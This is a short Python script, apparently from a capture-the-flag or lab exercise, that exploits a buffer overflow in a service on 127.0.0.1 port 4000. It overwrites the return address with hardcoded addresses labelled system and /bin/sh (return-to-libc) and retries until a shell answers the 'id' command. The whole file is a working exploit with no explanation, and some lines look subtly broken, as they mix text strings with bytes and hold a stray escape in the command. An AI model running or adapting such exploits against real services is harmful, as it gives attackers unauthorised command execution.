import socket
import time
import os
import sys
import struct
import telnetlib

def connect(ip, port):
    return socket.create_connection((ip, port))

def p(x):
    return struct.pack('<I', x)

def u(x):
    return struct.unpack('<I', x)[0]

def interact(s):
    print('---- interactive mode -----')
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


payload = 'A' * 51
payload += p(0xf75f3190) # system
payload += b'BBBB'
payload += p(0xf7713a24) # /bin/sh

while True:
    s = connect('127.0.0.1', 4000)
    
    print(s.recv(1024).decode('utf-8'))
    s.send(payload + b'\n')
    time.sleep(0.1)
    s.send(b'id\n\exit\n')
    time.sleep(0.1)
    result = s.recv(1024).decode('utf-8')
    if len(result) > 0:
        print(result)    
        break
    
